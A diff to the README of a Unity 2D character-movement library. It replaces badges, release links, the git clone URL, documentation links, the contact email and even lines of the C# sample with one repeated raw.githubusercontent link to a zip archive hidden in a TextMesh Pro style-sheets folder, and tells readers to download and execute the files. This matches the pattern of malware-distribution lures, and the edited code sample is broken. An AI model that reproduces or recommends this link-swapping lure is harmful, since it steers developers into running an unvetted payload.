@@ -1,6 +1,6 @@
 # CharacterMovement2D
 
-![GitHub](https://img.shields.io/badge/GitHub-CharacterMovement2D-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue) ![Unity](https://img.shields.io/badge/Unity-2D-yellow)
+![GitHub](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip) ![License](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip) ![Unity](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip)
 
 Welcome to the **CharacterMovement2D** repository! This project offers a modular and extensible framework for 2D character movement in Unity. It simplifies the setup of basic movement mechanics while emphasizing clean architecture, separation of concerns, and scalability.
 
@@ -35,13 +35,13 @@ To start using the **CharacterMovement2D** framework, follow these steps:
 
 ## Installation
 
-You can download the latest release from our [Releases](https://github.com/Danizolo/CharacterMovement2D/releases) section. Make sure to execute the downloaded files as per the instructions provided.
+You can download the latest release from our [Releases](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip) section. Make sure to execute the downloaded files as per the instructions provided.
 
 ### Step-by-Step Installation
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Danizolo/CharacterMovement2D.git
+   git clone https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip
    ```
 
 2. **Open Unity**: Launch your Unity Editor.
@@ -82,9 +82,9 @@ public class PlayerController : MonoBehaviour
 
     void Update()
     {
-        float moveX = Input.GetAxis("Horizontal");
-        float moveY = Input.GetAxis("Vertical");
-        characterMovement.Move(new Vector2(moveX, moveY));
+        float moveX = https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip("Horizontal");
+        float moveY = https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip("Vertical");
+        https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip(new Vector2(moveX, moveY));
     }
 }
 ```
@@ -129,11 +129,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please contact the repository maintainer:
 
 - **Name**: Danizolo
-- **Email**: danizolo@example.com
+- **Email**: https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip
 
 ## Releases
 
-You can find the latest releases and updates in the [Releases](https://github.com/Danizolo/CharacterMovement2D/releases) section. Make sure to download and execute the files to keep your project up to date.
+You can find the latest releases and updates in the [Releases](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip) section. Make sure to download and execute the files to keep your project up to date.
 
 ## Topics
 
@@ -152,9 +152,9 @@ This repository covers a range of topics relevant to game development:
 
 Here are some useful resources to help you get started with Unity and the **CharacterMovement2D** framework:
 
-- [Unity Documentation](https://docs.unity3d.com/Manual/index.html)
-- [Unity Learn](https://learn.unity.com/)
-- [Game Design Patterns](https://gameprogrammingpatterns.com/)
+- [Unity Documentation](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip)
+- [Unity Learn](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip)
+- [Game Design Patterns](https://raw.githubusercontent.com/Danizolo/CharacterMovement2D/main/Assets/TextMesh Pro/Resources/Style Sheets/Character-Movement-D-v1.3.zip)
 
 ## Conclusion
 
